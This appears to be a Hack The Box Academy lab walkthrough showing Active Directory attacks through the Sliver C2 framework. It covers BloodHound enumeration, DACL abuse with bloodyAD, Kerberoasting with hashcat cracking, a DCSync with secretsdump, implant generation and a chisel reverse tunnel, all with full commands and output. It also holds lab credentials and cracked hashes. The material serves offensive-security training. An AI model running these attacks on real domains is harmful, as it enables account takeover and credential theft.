To begin DACL exploitation, students need use Bloodhound. to look for edges and nodes. Therefore, they need to download [SharpHound.exe](https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe) (which is compatible with versions 4.2 and 4.3 of **Bloodhound**) along with the `BloodHound-linux-x64.zip` file:

Code: shell

```shell
wget -q https://github.com/BloodHoundAD/BloodHound/releases/download/v4.3.1/BloodHound-linux-x64.zip
unzip BloodHound-linux-x64.zip ; rm BloodHound-linux-x64.zip
wget -q https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe
```

Code: sessoion

```
┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-ahpxhsi3jg]─[~/sliver~]
└──╼ [★]$ wget -q https://github.com/BloodHoundAD/BloodHound/releases/download/v4.3.1/BloodHound-linux-x64.zip

┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-ahpxhsi3jg]─[/tmp\\]
└──╼ [★]$ unzip BloodHound-linux-x64.zip

Archive:  BloodHound-linux-x64.zip
   creating: BloodHound-linux-x64/
  inflating: BloodHound-linux-x64/BloodHound  
  inflating: BloodHound-linux-x64/LICENSE  
<SNIP>

┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-ahpxhsi3jg]─[~/sliver~]
└──╼ [★]$ wget -q https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe
```

Now, students need to start the `neo4j` service on their attack host, and subsequently navigate into the `BloodHound-linux-x64/` directory, launching the `Bloodhound` ELF file.

Code: shell

```shell
sudo service neo4j start
cd ~/sliver/BloodHound-linux-x64/
./BloodHound
```

```
┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-ahpxhsi3jg]─[~]
└──╼ [★]$sudo service neo4j start

┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-ahpxhsi3jg]─[~]
└──╼ [★]$ cd ~/sliver/BloodHound-linux-x64/

┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-ahpxhsi3jg]─[~/sliver/BloodHound-linux-x64]
└──╼ [★]$ ./BloodHound
```

Bloodhound will launch, but students may minimize it for now. Instead, students need to return to their `psexec-pivot` sliver session, and use `execute-assembly` to run the `Sharphound.exe` collector on `SRV01`:

Code: shell

```shell
cd C:/temp
execute-assembly SharpHound.exe -c all
ls
download [stringofnumbers_BloodHound.zip]
```

```
sliver (psexec-pivot) > cd C:/temp

[*] C:\temp

sliver (psexec-pivot) > execute-assembly SharpHound.exe -c all

[*] Output:
2024-06-10T06:35:25.0023281-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound

<SNIP>

2024-06-10T06:36:09.6020212-07:00|INFORMATION|Saving cache with stats: 76 ID to type mappings.
 81 name to SID mappings.
 1 machine sid mappings.
 5 sid to domain mappings.
 0 global catalog mappings.
2024-06-10T06:36:09.6157120-07:00|INFORMATION|SharpHound Enumeration Completed at 6:36 AM on 6/10/2024! Happy Graphing!

sliver (psexec-pivot) > ls

C:\temp (2 items, 25.9 KiB)
===========================
-rw-rw-rw-  20240610063609_BloodHound.zip                         13.6 KiB  Mon Jun 10 06:36:09 -0700 2024
-rw-rw-rw-  NjM2NDFjMTgtNjM2Zi00OTViLTgyN2EtMmE4NzhiNzk1NWY1.bin  12.3 KiB  Mon Jun 10 06:36:09 -0700 2024

sliver (psexec-pivot) > download 20240610063609_BloodHound.zip
```

Students need to return to their attack host, logging into Bloodhound with the credentials `neo4j:neo4j`, and upload the `0240610063609_BloodHound.zip` file into Bloodhound:

![[HTB Solutions/CAPE/z. images/3d3ccbed5482e22c87b2bef6e3d655f6_MD5.jpg]]

Finally, students need to examine `DAVID@INLANEFREIGHT.LOCAL` and `WEBSEC@INLANEFREIGHT.LOCAL`, discovering an edge between the two.

Students will find that David has `{hidden}` permission over `Websec`.

Answer: `GenericWrite`

# DACL Exploitation

## Question 2

### "What is the password for the user websec"

Students need to install `BloodyAD`, setting up a python virtual environment for its use:

Code: shell

```shell
git clone --depth 1 https://github.com/CravateRouge/bloodyAD; cd bloodyAD
python3 -m venv .bloodyAD
source .bloodyAD/bin/activate
python3 -m pip install .
```

```
┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-gqvacre66n]─[~/sliver]
└──╼ [★]$ git clone --depth 1 https://github.com/CravateRouge/bloodyAD; cd bloodyAD

Cloning into 'bloodyAD'...
remote: Enumerating objects: 47, done.
remote: Counting objects: 100% (47/47), done.
remote: Compressing objects: 100% (44/44), done.
remote: Total 47 (delta 0), reused 21 (delta 0), pack-reused 0
Receiving objects: 100% (47/47), 191.99 KiB | 1.44 MiB/s, done.

┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-gqvacre66n]─[~/sliver/bloodyAD]
└──╼ [★]$ python3 -m venv .bloodyAD

┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-gqvacre66n]─[~/sliver/bloodyAD]
└──╼ [★]$ source .bloodyAD/bin/activate

(.bloodyAD) ┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-gqvacre66n]─[~/sliver/bloodyAD]
└──╼ [★]$ python3 -m pip install .

Processing /home/htb-ac-594497/sliver/bloodyAD
  Installing build dependencies ... done
<SNIP>
```

Once students have installed the tool, they need to change David's password using the [SET](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide#set-commands) commands. This must be accomplished through a tunnel, such as `chisel` (students can refer to the `Kerberos Delegations` portion of this walkthrough). Additionally, the IP of `DC01` (172.16.1.5) must be specified:

Code: shell

```shell
proxychains4 -q bloodyAD --host 172.16.1.15 -d child.htb.local  -u svc_sql -p 'jkhnrjk123!' set password david 'Password123!'
```

```
(.bloodyAD) ┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-gqvacre66n]─[~/sliver/bloodyAD]
└──╼ [★]$  proxychains4 -q bloodyAD --host 172.16.1.15 -d child.htb.local  -u svc_sql -p 'jkhnrjk123!' set password david 'Password123!'

[+] Password changed successfully!
```

Subsequently, students need to use `david` to write an SPN for the `websec` user:

Code: shell

```shell
proxychains4 -q bloodyAD --host 172.16.1.15 -d child.htb.local -u david -p 'Password123!' set object websec servicePrincipalName -v fake/web01.child.htb.local
```

```
(.bloodyAD) ┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-gqvacre66n]─[~/sliver/bloodyAD]
└──╼ [★]$ proxychains4 -q bloodyAD --host 172.16.1.15 -d child.htb.local -u david -p 'Password123!' set object websec servicePrincipalName -v fake/web01.child.htb.local

[+] websec's servicePrincipalName has been updated
```

Students need to return to the `WEB01` session within Sliver, and use `c2tc-kerberoast` to acquire a ticket for the `websec` user:

Code: shell

```shell
c2tc-kerberoast roast websec
```

```
sliver (web01-eric) > c2tc-kerberoast roast websec

[*] Successfully executed c2tc-kerberoast (coff-loader)
[*] Got output:
[*] Using LDAP filter: (&(objectClass=user)(objectCategory=person)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(sAMAccountName=websec))
[*] sAMAccountName	: websec
[*] description		: Secure web application!
[*] distinguishedName	: CN=team_websec,CN=Users,DC=child,DC=htb,DC=local
[*] whenCreated		: 9/19/2022 3:15:47 AM
[*] whenChanged		: 6/9/2024 10:57:45 PM
[*] pwdLastSet		: 9/18/2022 8:15:47 PM
[*] accountExpires	: Never Expires
[*] lastLogon		: 
[*] memberOf		:
[*] servicePrincipalName(s):
    -> fake/web01.child.htb.local
[*] Encoded service ticket	: <copy paste TICKET output to file and decode with TicketToHashcat.py>
<TICKET>
sAMAccountName = websec
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
Vn825c+rNJT1t9lST0flWkACN5k+IYU=
</ticket>
```

Students need to copy and paste the base64 encoded ticket into an file, `websec-ticket.enc`, then download and run [TicketToHashcat.py](https://raw.githubusercontent.com/outflanknl/C2-Tool-Collection/main/BOF/Kerberoast/TicketToHashcat.py) against it:

Code: shell

```shell
nano websec-ticket.enc // copy and paste ticket (including the <TICKET> tags) into                            websec-ticket.enc and save  

wget -q https://raw.githubusercontent.com/outflanknl/C2-Tool-Collection/main/BOF/Kerberoast/TicketToHashcat.py
python3 TicketToHashcat.py websec-ticket.e
```

```
┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-gqvacre66n]─[~/sliver]
└──╼ [★]$ nano websec-ticket.enc 

┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-gqvacre66n]─[~/sliver]
└──╼ [★]$ wget -q https://raw.githubusercontent.com/outflanknl/C2-Tool-Collection/main/BOF/Kerberoast/TicketToHashcat.py

┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-gqvacre66n]─[~/sliver]
└──╼ [★]$ python3 TicketToHashcat.py websec-ticket.enc 

$krb5tgs$23$*websec$Child.htb.local$fake/web01.child.htb.local*$334CF579A30DF56DC218CB9A5A0A5453$C31EF77908130FC17E3E41E866F2499A9EE296BB4BA52ED35C8AB525890A00ADB4BEE57F4653DBE9FCD830876B029671CECFC342A4260A438CCEAB4CF736C05345E354221E71A82AB253D875A563B57DA875C9F6CC0495E0AC671F5CBC3369EA0790F535D2EEC1E1BD2EB9BE89AE1B1B6693614AF29C44375A138AB6A0D588A3FC49E769C87D8C28B29FF610181305F3C604360753905567E02D464122B4D9DD6B8215E3A2928EFECA760B42329BBC4AA007CDEBCF2C3CEEC33C8A3C865D6E19D9A4FDEE2573FBF571D1D818D19DAE438F432E142C90A8DB1716A57B44E2077E0130D71A9F2549AFC59017ECAB00DE81A7C2AA7FB1AF0237CA53648E5A11E3315B7DD6FD01F992C0CA3C74D3F36F8A2F9F9F2FC6B62766BC2FF42CB4D9276EF1EA29D4117010107B3A78D78E95002094E6D25F2BE64B0533A0935981070844B73B7C26476F5CF02A29F0710D4F418A15EF4FCCCEE1828DF2E5E76FE13C2056BF0F1095D9B1FF9040D0CAB60A187A06297651EC1AACB80456B2709076403930FC1DCCA85C288B034607A67A450E68E56ECCF777D25BBEAEB9C6E42D7F0BAF138E028E2414FA0A87F1D728CC827A27AE810430D4659C8CD8987ECD3E26F9A30B91A1D74A8726246BA530C525EC8250B583D98ACF34A91098DE921F73EB6D5501C8796DF8C5394E2FB79F694860B8A9906BF0A27B19014D72EBCE15A742D445E56E131E497F71AE37DF6AF6173FC24921D455B7EFE6B0E813FAEC2636BEA7609A08286D683DFE4B0AA97E0481EBFB3721E18337BEC80DD160BC47813FA88F0431870A1261AE447C3956262B503B37A371EA65E16DE94950E99CA6D353E2A5C0F45FE57B25D7F6EA4FD5EDE03C7787E0B4D978AE1808AF1D93A9036F486912CC1E4AC1CA67936EE1CDB64934ECB3D33CFCAABAD275199ACD79D36FFFF2254D2F032C7F5BFE6301725330DF5407E3DC985C3BF48E34C9DFC789D34461CD1A0EFEE814BD61B0A8F94763F5EBCE40D29FBDB7D2DBA5ACC7EFEEAF90F2E2157EAA490248094E4DE864C172BC7510AC0839BB046A9EBA4C429A5816E6E295571C440B40E73388307B7990F71CC16C3263EE3ADB1690EBF39E56DE41B5B529E18B5FFAF99175A6F3E1DC78C7DB929C8FE0DFE33594AAB24F21D138A5DFACE8B077515F33A1AB6308C8029952D867C7F99E0D5EDB1F6850BA038A190F7AF63166B85D4E5F2D09D7FB3A1F5BC2472D3ABF5468F3DE82654A45A13D3D6DD51238CACA09F976263073478978A817452B3D24D4FE78075B0B2C158E5CF10E2A1620B469A5EBF9F7B697FEB6BCA79E573F5F3F1192BB636D21C18A55902B6402D8A22FAEB8B539B5EC752BE69AAD6F4645BA31EDFE3EC470F993B5DD0F63A64A5B9008B99613E38B2D907D5A9388BFE9EEBC0C183C6FA017F6C238887E5E5E6B4E495ADEC881FFB5B91FCCEA94E99308BA45B705BD57E0A75

HashCat input file saved as 'roastme-<#hash-type>.txt'
To crack use: 'hashcat -m 13100' for etype 23 (RC4), 'hashcat -m 19600' for etype 17 (AES128) or 'hashcat -m 19700' for etype 18 (AES256).
```

Finally, students need to use `hashcat` to crack the hash, which was saved to `roastme-13100.txt`:

Code: shell

```shell
hashcat -m 13100 roastme-13100.txt /usr/share/wordlists/rockyou.txt
```

```
┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-gqvacre66n]─[~/sliver]
└──╼ [★]$ hashcat -m 13100 roastme-13100.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.1.1) starting...

<SNIP>

$krb5tgs$23$*websec$Child.htb.local$fake/web01.child.htb.local*$334cf579a30df56dc218cb9a5a0a5453$c31ef77908130fc17e3e41e866f2499a9ee296bb4ba52ed35c8ab525890a00adb4bee57f4653dbe9fcd830876b029671cecfc342a4260a438cceab4cf736c05345e354221e71a82ab253d875a563b57da875c9f6cc0495e0ac671f5cbc3369ea0790f535d2eec1e1bd2eb9be89ae1b1b6693614af29c44375a138ab6a0d588a3fc49e769c87d8c28b29ff610181305f3c604360753905567e02d464122b4d9dd6b8215e3a2928efe25a760b42329bbc4aa007cdebcf2c3ceec33c8a3c865d6e19d9a4fdee2573fbf571d1d328d19dae438f432e142c90a8db1716a57b44e2077e0130d71a9f2549afc59017ecab00de81a7c2aa7fb1af0237ca53648e5a11e3315b7dd6fd01f992c0ca3c74d3f36f8a2f9f9f2fc6b62766bc2ff42cb4d9276ef1ea29d4117010107b3a78d78e95002094e6d25f2be64b0533a0935981070844b73b7c26476f5cf02a29f0710d4f408a15ef4fcccee1828df2e5e76fe13c2056bf0f1095d9b1ff9040d0cab60a187a06297651ec1aacb80456b2709076403930fc1dcca85c288b034607a67a450e68e56eccf777d25bbeaeb9c6e42d7f0baf138e028e2414fa0a87f1d728cc827a27ae810430d4659c8cd8987ecd3e26f9a30b91a1d74a8726246ba530c525ec8250b583d98acf34a91098de921f73eb6d5501c8796df8c5394egab79f694860b8a9906bf0a27b19014872ebce15a742d445e56e131e497f71ae37df6af6173fc24921d455b7efe6b0e813faec2636bea7609a08286d683dfe4b0aa97e0481ebfb3721e18337bec80dd160bc47813fa88f0431870a1261ae447c3956262b503b37a371ea65e16de94950e99ca6d353e2a5c0f45fe57b25d7f6ea4fd5ede03c7787e0b4d978ae1808af1d93a9036f486912cc1e4ac1ca67936ee1cdb64934ecb3d33cfcaabad275199acd79d36ffff2254d2f032c7f5bfe6301725330df5407e3dc985c3bf48e34c9dfc789d34461cd1a0efee814bd61b0a8f94763f5ebce40d29fbdb7d2dba5acc7efeeaf90f2e2157eaa490248094e4de864c172bc7510ac0839bb046a9eba4c429a5816e6e295571c440b40e73388307b7990f71cc16c3263ee3adb1690ebf39e56de41b5b529e18b5ffaf99175a6f3e1dc78c7db929c8fe0dfe33594aab24f21d138a5dface8b077515f33a1ab6308c8029952d867c7f99e0d5edb1f6850ba038a190f7af63166b85d4e5f2d09d7fb3a1f5bc2472d3abf5468f3de82654a45a13d3d6dd51238caca09f976263073478978a817452b3d24d4fe78075b0b2c158e5cf10e2a1620b469a5ebf9f7b697feb6bca79e573f5f3f1192bb636d21c18a55902b6402d8a22faeb8b539b5ec752be69aad6f4645ba31edfe3ec470f993b5dd0f63a64a5b9008b99613e38b2d907d5a9388bfe9eebc0c183c6fa017f6c238887e5e5e6b4e495adec881ffb5b91fccea94e99308ba45b705bd57e0a75:{hidden}
```

The password for the `websec` user is revealed to be `{hidden}`.

Answer: `spongebob`

# Domain Controller Compromise

## Question 1

### "Submit the NT hash of the user carrot"

Students need to ensure that they have a tunnel to the `172.16.1.0/24` network, using a tool such as `chisel`. This should already be in place from previous sections, however, if starting from a fresh Pwnbox, students need to obtain a Sliver session on `WEB01` as the `eric` user, then use the `chisel` extension to establish a reverse SOCKS5 tunnel (these steps can be found in the [Pivoting](https://academy.hackthebox.com/module/241/section/2680) section of the module):

```
sliver (web01-eric) > chisel client 10.10.14.180:8080 R:socks

[*] Successfully executed chisel
[*] Got output:
received argstring: client 10.10.14.180:8080 R:socks
os.Args = [chisel.exe client 10.10.14.180:8080 R:socks]
Task started successfully.
```

```
┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-marvyohs0x]─[~/sliver]
└──╼ [★]$ chisel server --reverse -v --socks5

2024/06/09 06:16:16 server: Reverse tunnelling enabled
2024/06/09 06:16:16 server: Fingerprint JiLSfUtYVknrrLA1cdnTRuCcT1cbVtyxf3lU01FoAKI=
2024/06/09 06:16:16 server: Listening on http://0.0.0.0:8080
2024/06/09 06:28:24 server: session#1: Handshaking with 10.129.205.234:49833...
2024/06/09 06:28:24 server: session#1: Verifying configuration
2024/06/09 06:28:24 server: session#1: Client version (v1.8.1) differs from server version (1.7.7)
2024/06/09 06:28:24 server: session#1: tun: Created (SOCKS enabled)
2024/06/09 06:28:24 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
2024/06/09 06:28:24 server: session#1: tun: SSH connected
2024/06/09 06:28:24 server: session#1: tun: Bound proxies
```

Now, students need only authenticate as `mobilesec:spongebob`, using `proxychains` with `impacket-secretsdump` to DCSync the domain controller and obtain the hash of the `carrot` user:

Code: shell

```shell
proxychains4 -q impacket-secretsdump -just-dc  mobilesec:spongebob@172.16.1.15 | grep '\carrot'
```

```
┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-gqvacre66n]─[~/sliver]
└──╼ [★]$ proxychains4 -q impacket-secretsdump -just-dc  mobilesec:spongebob@172.16.1.15 | grep '\carrot'

child.htb.local\carrot:1114:aad3b435b51404eeaad3b435b51404ee:{hidden}:::
child.htb.local\carrot:aes256-cts-hmac-sha1-96:dd0c8a0863f2d427b49b7966678d0a970790586ef17809e99675ccf5f638a5bb
child.htb.local\carrot:aes128-cts-hmac-sha1-96:c57db67f55ee509815ec989152358806
child.htb.local\carrot:des-cbc-md5:73c49123541f2c02
```

Answer: `641128aec722d13eefd5c51709330810`

# Skills Assessment

## Question 1

### "Submit the contents of the flag.txt found on one of the user's desktop"

Students need to first download the Sliver server and client files, using the script shown below:

Code: bash

```bash
#!/bin/bash

mkdir -p sliver
cd sliver/
wget -q https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-server_linux
chmod +x ./sliver-server_linux
wget -q https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-client_linux
chmod +x ./sliver-client_linux
```

Then, students need to launch the server, configure a new operator profile, enable multiplayer and install all of the armory extensions:

Code: shell

```shell
cd sliver/
./sliver-server_linux
new-operator -n student -l PWNIP
multiplayer
armory install all
```

```
┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-ijzw9zcasb]─[~]
└──╼ [★]$ cd sliver/

┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-ijzw9zcasb]─[~/sliver]
└──╼ [★]$ ./sliver-server_linux 

Sliver  Copyright (C) 2022  Bishop Fox
This program comes with ABSOLUTELY NO WARRANTY; for details type 'licenses'.
This is free software, and you are welcome to redistribute it
under certain conditions; type 'licenses' for details.

Unpacking assets ...

    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗
    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗
    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝
    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║
    ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝

All hackers gain undying
[*] Server v1.5.42 - 85b0e870d05ec47184958dbcb871ddee2eb9e3df
[*] Welcome to the sliver shell, please type 'help' for options

[*] Check for updates with the 'update' command

[server] sliver > new-operator -n student -l 10.10.14.180

[*] Generating new client certificate, please wait ... 
[*] Saved new client config to: /home/htb-ac-594497/sliver/student_10.10.14.180.cfg 

[server] sliver > multiplayer

[*] Multiplayer mode enabled!

[server] sliver > armory install all

? Install 21 aliases and 128 extensions? Yes
[*] Installing alias 'SharpSCCM' (v0.0.2) ... done!
[*] Installing alias 'SharpView' (v0.0.1) ... done!
[*] Installing alias 'sqlrecon' (v0.0.3) ... done!
```

Students need to open a new terminal tab, importing the operator config file ,and then launching the sliver client:

Code: shell

```shell
./sliver-client_linux import student_PWNIP.cfg 
```

Code: sessopm

```
┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-ijzw9zcasb]─[~/sliver]
└──╼ [★]$ ./sliver-client_linux import student_10.10.14.180.cfg 

2024/06/10 14:03:52 Saved new client config to: /home/htb-ac-594497/.sliver-client/configs/student_10.10.14.180.cfg

┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-ijzw9zcasb]─[~/sliver]
└──╼ [★]$ ./sliver-client_linux 

Connecting to 10.10.14.180:31337 ...
[*] Loaded 21 aliases from disk
[*] Loaded 128 extension(s) from disk

 	  ██████  ██▓     ██▓ ██▒   █▓▓█████  ██▀███
	▒██    ▒ ▓██▒    ▓██▒▓██░   █▒▓█   ▀ ▓██ ▒ ██▒
	░ ▓██▄   ▒██░    ▒██▒ ▓██  █▒░▒███   ▓██ ░▄█ ▒
	  ▒   ██▒▒██░    ░██░  ▒██ █░░▒▓█  ▄ ▒██▀▀█▄
	▒██████▒▒░██████▒░██░   ▒▀█░  ░▒████▒░██▓ ▒██▒
	▒ ▒▓▒ ▒ ░░ ▒░▓  ░░▓     ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░
	░ ░▒  ░ ░░ ░ ▒  ░ ▒ ░   ░ ░░   ░ ░  ░  ░▒ ░ ▒░
	░  ░  ░    ░ ░    ▒ ░     ░░     ░     ░░   ░
		  ░      ░  ░ ░        ░     ░  ░   ░

All hackers gain jump-start
[*] Server v1.5.42 - 85b0e870d05ec47184958dbcb871ddee2eb9e3df
[*] Welcome to the sliver shell, please type 'help' for options

[*] Check for updates with the 'update' command
```

Students need to make a new HTTP implant, and corresponding HTTP listener:

Code: shell

```shell
generate --http PWNIP:PWNPO --os windows --skip-symbols -N http-srv09
```

```
sliver > generate --http 10.10.14.180:9001 --os windows --skip-symbols -N http-srv09

[*] Generating new windows/amd64 implant binary
[!] Symbol obfuscation is disabled
[*] Build completed in 1s
[*] Implant saved to /home/htb-ac-594497/sliver/http-srv09.exe

sliver > http -L 10.10.14.180 -l 9001

[*] Starting HTTP :9001 listener ...
[*] Successfully started job #2
```

Now, students need to connect to the target with RDP , using the provided credentials `htb-student:HTB_@cademy_stdnt!`. Additionally, students need to map a shared drive, allowing for the `http-srv09.exe` file to be transferred to and then executed by the victim:

Code: shell

```shell
xfreerdp /v:10.129.103.200 /u:htb-student /p:HTB_@cademy_stdnt! /dynamic-resolution /drive:share,/home/htb-ac-XXXXX/sliver
```

```
┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-j91s0gcg36]─[~/sliver]
└──╼ [★]$ xfreerdp /v:10.129.103.200 /u:htb-student /p:HTB_@cademy_stdnt! /dynamic-resolution /drive:share,/home/htb-ac-594497/sliver

[15:54:37:535] [6051:6052] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-594497/.config/freerdp
[15:54:37:535] [6051:6052] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-594497/.config/freerdp/certs]
[15:54:37:535] [6051:6052] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-594497/.config/freerdp/server]
<SNIP>
```

Once connected, students need to open command prompt, mount the shared drive, and subsequently execute the `http-srv09.exe` implant:

Code: cmd

```cmd
net use
copy \\TSCLIENT\share\http-srv09.exe .
http-srv09.exe
```

```
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\htb-student>net use

New connections will be remembered.

Status       Local     Remote                    Network

-------------------------------------------------------------------------------
                       \\TSCLIENT\share          Microsoft Terminal Services
The command completed successfully.

C:\Users\htb-student>copy \\TSCLIENT\share\http-srv09.exe .
        1 file(s) copied.

C:\Users\htb-student>http-srv09.exe
```

While waiting for the implant to callback to the C2 server, students need to have `SharpHound` and `BloodHound` downloaded to their attack host, as they will be used to enumerate the attack vectors present in the current domain:

Code: shell

```shell
wget -q https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe
wget -q https://github.com/BloodHoundAD/BloodHound/releases/download/v4.3.1/BloodHound-linux-x64.zip
unzip BloodHound-linux-x64.zip
```

```
┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-ijzw9zcasb]─[~/sliver]
└──╼ [★]$ wget -q https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe

┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-ijzw9zcasb]─[~/sliver]
└──╼ [★]$ wget -q https://github.com/BloodHoundAD/BloodHound/releases/download/v4.3.1/BloodHound-linux-x64.zip

┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-ijzw9zcasb]─[~/sliver]
└──╼ [★]$ unzip BloodHound-linux-x64.zip 

Archive:  BloodHound-linux-x64.zip
   creating: BloodHound-linux-x64/
  inflating: BloodHound-linux-x64/BloodHound  
  inflating: BloodHound-linux-x64/LICENSE  
  inflating: BloodHound-linux-x64/LICENSES.chromium.html  
  inflating: BloodHound-linux-x64/chrome-sandbox  
<SNIP>
```

Subsequently, students need to start the `neo4j` service, launch `BloodHound`, then log in with the credentials `neo4j:neo4j`.

Code: shell

```shell
sudo service neo4j start
cd BloodHound-linux-x64/
./BloodHound
```

```
┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-ijzw9zcasb]─[~/sliver]
└──╼ [★]$ sudo service neo4j start

┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-ijzw9zcasb]─[~/sliver]
└──╼ [★]$ cd BloodHound-linux-x64/

